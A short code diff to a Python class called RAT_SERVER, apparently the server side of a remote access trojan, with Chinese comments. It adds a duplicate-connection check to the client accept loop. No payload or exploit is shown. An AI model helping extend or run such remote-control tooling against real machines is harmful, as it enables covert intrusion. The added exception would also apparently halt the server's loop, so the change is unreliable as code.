@@ -54,6 +54,11 @@ class RAT_SERVER:
         while True:
             # 循环接受所有客户端连接
             client, addr = s.accept()
+            # 检查重复连接
+            for tmp_client in self.clients:
+                if addr[0] == tmp_client[1]:
+                    client.close()
+                    raise Exception("Client already connected")
             # 接受到连接后，创建一个线程处理子线程
             client_thread = threading.Thread(target=self.handle_client, args=(client, addr, msg_queue))
             # 开启客户端处理子线程
